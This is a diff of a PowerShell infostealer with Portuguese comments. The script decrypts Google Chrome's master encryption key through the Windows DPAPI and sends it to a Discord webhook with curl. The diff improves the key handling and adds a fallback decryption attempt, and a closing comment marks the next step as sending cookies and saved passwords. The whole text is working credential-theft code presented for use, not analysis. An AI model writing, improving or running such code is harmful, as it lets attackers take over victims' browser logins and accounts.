@@ -2,29 +2,35 @@ $u = "https://discord.com/api/webhooks/1503748038915522710/OaPmBZZTpD_TSm2m5YtSY
 Add-Type -AssemblyName System.Security
 
 try {
-    $base = "$env:LOCALAPPDATA\Google\Chrome\User Data"
-    $ls = Get-ChildItem -Path $base -Recurse -Filter "Local State" | Select-Object -First 1
-    
-    if (!$ls) { curl.exe -F "content=❌ Local State nao encontrado" $u; exit }
+    $localStatePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
+    $json = Get-Content $localStatePath -Raw | ConvertFrom-Json
+    $encryptedKey = $json.os_crypt.encrypted_key
 
-    # 1. Pega o conteúdo do JSON
-    $j = Get-Content $ls.FullName -Raw | ConvertFrom-Json
-    $encKey = $j.os_crypt.encrypted_key
+    # Converte de Base64
+    $allBytes = [Convert]::FromBase64String($encryptedKey)
     
-# 2. Converte de Base64 e corta os 5 bytes do prefixo 'DPAPI'
-$keyBytes = [Convert]::FromBase64String($encryptedKey)
-$trimmedKey = $keyBytes[5..($keyBytes.Length - 1)]
+    # O Chrome coloca 'DPAPI' (5 bytes) no início. Precisamos remover isso.
+    # Mas vamos garantir que estamos pegando apenas o que importa:
+    $trimmedKey = $allBytes[5..($allBytes.Length - 1)]
 
-# 3. A MÁGICA: Descriptografa usando a API do Windows
-try {
     Add-Type -AssemblyName System.Security
-    $decryptedKey = [System.Security.Cryptography.ProtectedData]::Unprotect($trimmedKey, $null, 'CurrentUser')
-    $finalKey = [Convert]::ToBase64String($decryptedKey)
     
-    # Envia para o Discord - ESTA É A QUE VOCÊ COPIA
+    # Tentativa de Unprotect com tratamento de escopo explícito
+    $decryptedKey = [System.Security.Cryptography.ProtectedData]::Unprotect($trimmedKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
+    
+    $finalKey = [Convert]::ToBase64String($decryptedKey)
     curl.exe -F "content=🔑 CHAVE_MESTRA_PRONTA: $finalKey" $u
+
 } catch {
-    curl.exe -F "content=❌ Erro Fatal: O Windows bloqueou a chave. Erro: $($_.Exception.Message)" $u
+    # Se der erro de parâmetro, vamos tentar uma alternativa de limpeza de bytes
+    try {
+        $trimmedKey = $allBytes | Select-Object -Skip 5
+        $decryptedKey = [System.Security.Cryptography.ProtectedData]::Unprotect($trimmedKey, $null, 'CurrentUser')
+        $finalKey = [Convert]::ToBase64String($decryptedKey)
+        curl.exe -F "content=🔑 CHAVE_MESTRA_PRONTA_ALT: $finalKey" $u
+    } catch {
+        curl.exe -F "content=❌ Erro persistente na chave: $($_.Exception.Message)" $u
+    }
 }
 
     # 4. Envia os arquivos (Cookies e Senhas)
